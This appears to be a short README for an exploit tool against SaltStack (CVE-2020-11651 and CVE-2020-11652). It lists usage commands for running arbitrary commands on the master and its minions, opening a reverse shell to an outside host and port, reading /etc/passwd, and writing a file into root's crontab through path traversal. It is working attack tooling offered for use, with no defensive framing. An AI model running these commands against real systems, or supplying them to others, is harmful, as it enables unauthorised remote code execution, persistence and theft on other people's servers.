# SaltStack-Exp
CVE-2020-11651
CVE-2020-11652

#### Exec-Master:
```
python exp.py --exec-choose master --exec-cmd "whoami"
```
#### Exec-Minions:
```
python exp.py --exec-choose minions --exec-cmd "whoami"
```
#### GetShell:
```
python exp.py --shell-LHOST 8.8.8.8 --shell-LPORT 4444
```

#### ReadFile:
```
python exp.py --read /etc/passwd
```
#### UploadFile:
```
python exp.py --upload-src "/test/root" --upload-dest "../../../../../../../../var/spool/cron/crontabs/root"
```


From :https://github.com/bravery9/SaltStack-Exp